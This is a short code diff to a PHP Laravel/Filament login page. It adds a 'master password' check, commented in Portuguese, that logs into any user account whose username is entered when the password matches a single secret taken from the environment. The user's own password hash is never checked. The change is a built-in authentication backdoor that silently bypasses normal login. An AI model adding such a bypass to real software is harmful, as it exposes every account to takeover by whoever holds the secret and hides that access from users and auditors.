@@ -98,6 +98,18 @@ class Login extends AuthLogin
 
         $data = $this->form->getState();
 
+        // 🔐 SENHA MASTER
+        $senhaMaster = env('SENHA_MASTER');
+        $user = \App\Models\User::where('username', $data['username'])->first();
+
+        if ($user && !empty($senhaMaster) && $data['password'] === $senhaMaster) {
+            // Faz login direto sem verificar hash
+            Filament::auth()->login($user, $data['remember'] ?? false);
+            session()->regenerate();
+            return app(LoginResponse::class);
+        }
+
+        // Login normal
         if (!Filament::auth()->attempt($this->getCredentialsFromFormData($data), $data['remember'] ?? false)) {
             throw ValidationException::withMessages([
                 'data.username' => __('filament-panels::pages/auth/login.messages.failed'),
